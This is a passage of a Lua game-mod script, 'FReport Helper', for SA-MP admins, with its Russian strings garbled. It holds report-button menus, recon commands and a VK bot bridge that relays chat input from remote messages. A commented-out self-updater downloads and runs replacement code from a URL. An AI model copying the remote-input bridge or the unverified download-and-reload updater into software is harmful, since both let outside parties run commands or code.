	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.devyattext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##devyatknop', text_buffer_devyatknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##devyattext', text_buffer_devyattext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#9 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_devyatknop.v == '' then 
cfg.settings.devyatknopka = u8"�9 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.devyatknopka = text_buffer_devyatknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.devyatknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	
if imgui.Button(u8'#9 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_devyattext.v == '' then 
cfg.settings.devyattext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.devyattext = text_buffer_devyattext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.devyattext), 0xffdead)
	end
	end
	
	imgui.Separator()
	--
			 	imgui.CenterTextColoredRGB('������  {ffdead}�10{ffffff}: ')
		imgui.SetCursorPosX(140)
	if imgui.Button(cfg.settings.desyatknopka, imgui.ImVec2(500, 25)) then
	if cfg.settings.desyattext == none then
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. �� ��� �� �������� �������� ������.', 0xffdead)
	else
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}��� ������ ��� �������. ����� ������� �� �������� ����� ����������:', 0xffdead)
	sampAddChatMessage('{ffffff}[REP] '..u8:decode(cfg.settings.desyattext), 0xffdead)
	end
	end
	imgui.TextColoredRGB('�������� ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##desyatknop', text_buffer_desyatknop, 165, u8"������� �������� ������", 2)
	
	imgui.SameLine()
	imgui.TextColoredRGB('   {ffdead}|')
	imgui.SameLine()
	imgui.TextColoredRGB('���������� ������ � ������:')
	imgui.SameLine()
	imgui.NewInputText(u8'##desyattext', text_buffer_desyattext, 240, u8"������� ���������� ������", 2)
	if imgui.Button(u8'#10 ���������', imgui.ImVec2(280, 20)) then
if text_buffer_desyatknop.v == '' then 
cfg.settings.desyatknopka = u8"�10 ����������������"
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, {32CD32}���������� {ffffff}��������� ��������.', 0xffdead)
else

	cfg.settings.desyatknopka = text_buffer_desyatknop.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� ������ ������� {32CD32}���������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}�������� ������: {ffdead}'..u8:decode(cfg.settings.desyatknopka), 0xffdead)
	end
	end
	imgui.SameLine()
	imgui.TextColoredRGB('{ffdead}|')
	imgui.SameLine()
	
if imgui.Button(u8'#10 ��������� ', imgui.ImVec2(-1, 20)) then
if text_buffer_desyattext.v == '' then 
cfg.settings.desyattext = none
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� ������ �� ��������, �������� {32CD32}���������� {ffffff}� {FF0000}nil{ffffff}.', 0xffdead)
else

	cfg.settings.desyattext = text_buffer_desyattext.v
	inicfg.save(cfg, cfgConfig)
	sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}����� � ������ ������� {32CD32}��������{ffffff}.', 0xffdead)
	sampAddChatMessage('{ffffff}����� � ������: {ffdead}'..u8:decode(cfg.settings.desyattext), 0xffdead)
	end
	end
	
	imgui.SetCursorPosX(280)
	if imgui.Button(u8'�������� ��� ������', imgui.ImVec2(200, 20)) then
	cfg.settings.pervayaknopka = u8"�1 ����������������"
cfg.settings.pervayatext = none
cfg.settings.dvaknopka = u8"�2 ����������������"
cfg.settings.dvatext = none
cfg.settings.triknopka = u8"�3 ����������������"
cfg.settings.tritext = none
cfg.settings.chetiriknopka = u8"�4 ����������������"
cfg.settings.chetiritext = none
cfg.settings.pyatknopka = u8"�5 ����������������"
cfg.settings.pyattext = none
cfg.settings.shestknopka = u8"�6 ����������������"
cfg.settings.shesttext = none
cfg.settings.semknopka = u8"�7 ����������������"
cfg.settings.semtext = none
cfg.settings.vosemknopka = u8"�8 ����������������"
cfg.settings.vosemtext = none
cfg.settings.devyatknopka = u8"�9 ����������������"
cfg.settings.devyattext = none
cfg.settings.desyatknopka = u8"�10 ����������������"
cfg.settings.desyattext = none
inicfg.save(cfg, cfgConfig)
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�� {32CD32}�������� {ffffff}�������� � ���� ���������������� ������.', 0xffdead)
sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}�������� {32CD32}���������� {ffffff}� ����������. ', 0xffdead)
	end
		imgui.EndChild()
		imgui.SetCursorPosX(125)
		--imgui.SetCursorPosY(370)
		if imgui.Button(u8"����� �� ������ ���������", imgui.ImVec2(530, 35)) then
		admmenu.v = true
        
        	izmenarmenu.v = false
end
	

 
	imgui.End()

end

function imgui.TextColoredRGB(text)
    local style = imgui.GetStyle()
    local colors = style.Colors
    local ImVec4 = imgui.ImVec4

    local explode_argb = function(argb)
        local a = bit.band(bit.rshift(argb, 24), 0xFF)
        local r = bit.band(bit.rshift(argb, 16), 0xFF)
        local g = bit.band(bit.rshift(argb, 8), 0xFF)
        local b = bit.band(argb, 0xFF)
        return a, r, g, b
    end

    local getcolor = function(color)
        if color:sub(1, 6):upper() == 'SSSSSS' then
            local r, g, b = colors[1].x, colors[1].y, colors[1].z
            local a = tonumber(color:sub(7, 8), 16) or colors[1].w * 255
            return ImVec4(r, g, b, a / 255)
        end
        local color = type(color) == 'string' and tonumber(color, 16) or color
        if type(color) ~= 'number' then return end
        local r, g, b, a = explode_argb(color)
        return imgui.ImColor(r, g, b, a):GetVec4()
    end

    local render_text = function(text_)
        for w in text_:gmatch('[^\r\n]+') do
            local text, colors_, m = {}, {}, 1
            w = w:gsub('{(......)}', '{%1FF}')
            while w:find('{........}') do
                local n, k = w:find('{........}')
                local color = getcolor(w:sub(n + 1, k - 1))
                if color then
                    text[#text], text[#text + 1] = w:sub(m, n - 1), w:sub(k + 1, #w)
                    colors_[#colors_ + 1] = color
                    m = n
                end
                w = w:sub(1, n - 1) .. w:sub(k + 1, #w)
            end
            if text[0] then
                for i = 0, #text do
                    imgui.TextColored(colors_[i] or colors[1], u8(text[i]))
                    imgui.SameLine(nil, 0)
                end
                imgui.NewLine()
            else imgui.Text(u8(w)) end
        end
    end

    render_text(text)
end

function main_imgui(arg)
    main_window_state.v = not main_window_state.v
end

function prices_imgui(arg)
    prices_window_state.v = not prices_window_state.v
end

function gps_imgui(arg)
    gps_window_state.v = not gps_window_state.v
end


  function cmdPostInfo()
	sampShowDialog(1337, '{FFD700}Speed {00FF00}Player', '{FFC000}��������� �������� ���������.\n\n����������� ��������: {00FF00}0.76\n\n{FFC000}�������� � ������ ������: {00FF00}', '{FF0000}Exit', 1)
  end

local rInfo = {
	state = false,
    id = -1,
    nickname = ''
}

--function cmd_recon(arg)
	--if arg:match("(%d+)") == nil then
	--	sampSendChat('/re')
	--elseif arg:match("(%d+)") ~= nil then
		--other.recon_id = tonumber(arg)
		--sampSendChat('/re '..other.recon_id)
	--end
--end

local panelki = -1 

function cmd_recon(arg)
if panelki == -1 then
sampAddChatMessage("{ffdead}[FReport Helper]:{FFFFFF} {FFD700}[�����������] {ffffff}�� ������ ��������� ��� ������ �� {FF7538}��� {ffffff}� {FF7538}SPACE{ffffff}.", -1)
end
 panelki = panelki + 1
  if panelki == 20 then
  sampAddChatMessage("{ffdead}[FReport Helper]:{FFFFFF} {FFD700}[�����������] {ffffff}�� ������ ��������� ��� ������ �� {FF7538}��� {ffffff}� {FF7538}SPACE{ffffff}.", -1)
 panelki = 0

 end
local id = arg:match("^(%d+)")
if (id == nil) then 
sampSendChat('/re')
return false
end
other.recon_id = tonumber(arg)
sampSendChat(string.format("/re %d", other.recon_id))
end



function cmd_reoff(arg)

sampSendChat("/reoff")
end



function isAccessScript(name)
  	local access = false
  	for i = 1, #accessName do
    if name:find(accessName[i]) then
	access = true
	break
  	end
end
	return access
end

--[[function autoupdate(json_url, prefix, url)
	local dlstatus = require('moonloader').download_status
	local json = getWorkingDirectory() .. '\\'..thisScript().name..'-version.json'
	if doesFileExist(json) then os.remove(json) end
	downloadUrlToFile(json_url, json,
	  function(id, status, p1, p2)
		if status == dlstatus.STATUSEX_ENDDOWNLOAD then
		  if doesFileExist(json) then
			local f = io.open(json, 'r')
			if f then
			  local info = decodeJson(f:read('*a'))
			  updatelink = info.updateurl
			  updateversion = info.latest
			  f:close()
			  os.remove(json)
			  if updateversion ~= thisScript().version then
				lua_thread.create(function(prefix)
				  local dlstatus = require('moonloader').download_status
				  local color = -1
				  sampAddChatMessage((prefix..'���������� ����������. ������� ���������� c '..thisScript().version..' �� '..updateversion), color)
				  wait(250)
				  downloadUrlToFile(updatelink, thisScript().path,
					function(id3, status1, p13, p23)
					  if status1 == dlstatus.STATUS_DOWNLOADINGDATA then
						print(string.format('��������� %d �� %d.', p13, p23))
					  elseif status1 == dlstatus.STATUS_ENDDOWNLOADDATA then
						print('�������� ���������� ���������.')
						sampAddChatMessage((prefix..'���������� ���������!'), color)
						goupdatestatus = true
						lua_thread.create(function() wait(500) thisScript():reload() end)
					  end
					  if status1 == dlstatus.STATUSEX_ENDDOWNLOAD then
						if goupdatestatus == nil then
						  sampAddChatMessage((prefix..'���������� ������ ��������. �������� ���������� ������..'), color)
						  update = false
						end
					  end
					end
				  )
				  end, prefix
				)
			  else
				update = false
				print('v'..thisScript().version..': ���������� �� ���������.')
			  end
			end
		  else
			print('v'..thisScript().version..': �� ���� ��������� ����������. ��������� ��� ��������� �������������� � N.Everyone � VK - @nikeveryone')
			update = false
		  end
		end
	  end
	)
	while update ~= false do wait(100) end
  end


--]]

--local ����� ��� = "����� ���"

-- 
local function closeDialog()
	sampSetDialogClientside(true)
	sampCloseCurrentDialogWithButton(0)
	sampSetDialogClientside(false)
end



function sendHelp()
if reloadvk == true then 
local response = ''
	response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
		response = response .. '�������� ������������, �������� �������������. \n\n'
		vk_request(response)
	else
	local response = '��� ������ � ���� ������������ ���������� �������� ������������. \n������ - ���������� �������� ������������ � ����. \n���� /a - ��������� � /a � ������ FReport Helper\nreload - ������������ ������� � ���� ������������� � ����'
	vk_request(response)
end
end
function sendTesta()  
local response = ''
	result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
	if reloadvk == true then 
	response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
		response = response .. '�������� ������������, �������� �������������. \n\n'
		vk_request(response)
	else
	response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
		response = response .. '���� ������� ������� (/a) - �������: V2.3 \n\n'
sampSendChat('/a [For Developers] [FReport Helper]: � ������� ������ ���������� FReport Helper 2.3 .')
vk_request(response)
end
end
reloadvk = false

function longpollResolve(result)
	if result then
		if debugMode.v then
			print(result)
		end
		if result:sub(1,1) ~= '{' then
			vkerr = '������!\n�������: ��� ���������� � VK!'
			return
		end
		local t = decodeJson(result)
		if t.failed then
			if t.failed == 1 then
				ts = t.ts
			else
				key = nil
				longpollGetKey()
			end
			return
		end
		if t.ts then
			ts = t.ts
		end
			
		 
		if recvBuf.v and t.updates then
			for k, v in ipairs(t.updates) do
				if v.type == 'message_new' and v.object.message and tonumber(v.object.message.from_id) == tonumber(idBuf.v) then
					if v.object.message.payload then
						local pl = decodeJson(v.object.message.payload)
						if pl.button then
						if pl.button == 'testa' then
		 sendTesta()
		 
		 end
		 if pl.button == 'reload' then
		 sendReload()
		 
		 end
							if pl.button == 'help'  then
								sendHelp()
							elseif pl.button == 'status' then
								sendStatus()
							end
						end
						return
					end
				--[[	if v.object.message.text then
						local text = v.object.message.text .. ' '

						--������� �� ������ ���� ���� ������� �������� ���������� ������ (!d � !dc ��� ������)
						if text:match('^' .. toCmd.v .. '%s-%d+%s') then
							if accId == tonumber(text:match('^' .. toCmd.v .. '%s-(%d+)%s')) then
								text = text:gsub(text:match('^' .. toCmd.v .. '%s-%d+%s*'), '')
							else
								return
							end
						end
						if text:match('^' .. status.v) then
							sendStatus()
						elseif text:match('^' .. diaAccept.v .. ' ') then
							text = text:sub(1, text:len() - 1)
							local style = sampGetCurrentDialogType()
							if style == 2 or style > 3 then
								sampSendDialogResponse(sampGetCurrentDialogId(), 1, tonumber(u8:decode(text:match('^' .. diaAccept.v .. ' (%d*)'))) - 1, -1)
							elseif style == 1 or style == 3 then
								sampSendDialogResponse(sampGetCurrentDialogId(), 1, -1, u8:decode(text:match('^' .. diaAccept.v .. ' (.*)')))
							else
								sampSendDialogResponse(sampGetCurrentDialogId(), 1, -1, -1)
							end
							closeDialog()
						elseif text:match('^' .. diaDecline.v .. ' ') then
							sampSendDialogResponse(sampGetCurrentDialogId(), 0, -1, -1)
							closeDialog()
						else
							text = text:sub(1, text:len() - 1)
							sampProcessChatInput(u8:decode(text))
						end
					end--]]
					local text = v.object.message.text .. ' '
					
		if text:match('!test ' .. '%s-%d+%s') then
							sampProcessChatInput(u8:decode(text))
					
						sampSendChat(text)
							end
				end
			end
		end
	end
end


function longpollGetKey()
	async_http_request('https://api.vk.com/method/groups.getLongPollServer?group_id=' .. ini.main.group .. '&access_token=' .. ini.main.token .. '&v=5.131', '', function (result)
		if result then
			if debugMode.v then
				print(result)
			end
			if not result:sub(1,1) == '{' then
				vkerr = '������!\n�������: ��� ���������� � VK!'
				return
			end
			local t = decodeJson(result)
			if t.error then
				vkerr = '������!\n���: ' .. t.error.error_code .. ' �������: ' .. t.error.error_msg
				return
			end
			server = t.response.server
			ts = t.response.ts
			key = t.response.key
			vkerr = nil
		end
	end)
end

math.randomseed(os.time())


function vk_request(msg)
	msg = msg:gsub('{......}', '')
	msg = '[' .. accId .. ']: ' .. msg
	msg = u8(msg)
	msg = url_encode(msg)
	local keyboard = vkKeyboard()
	keyboard = u8(keyboard)
	keyboard = url_encode(keyboard)
	msg = msg .. '&keyboard=' .. keyboard
	if sendBuf.v and ini.main.id ~= '' then
		local rnd = math.random(-2147483648, 2147483647)
		async_http_request('https://api.vk.com/method/messages.send', 'peer_id=' .. ini.main.id .. '&random_id=' .. rnd .. '&message=' .. msg .. '&access_token=' .. ini.main.token .. '&v=5.131',
		function (result)
			if debugMode.v then
				print(result)
			end
			local t = decodeJson(result)
			if not t then
				print(result)
				return
			end
			if t.error then
				vkerrsend = '������!\n���: ' .. t.error.error_code .. ' �������: ' .. t.error.error_msg
				return
			end
			vkerrsend = nil
		end)
	end
end

local vkw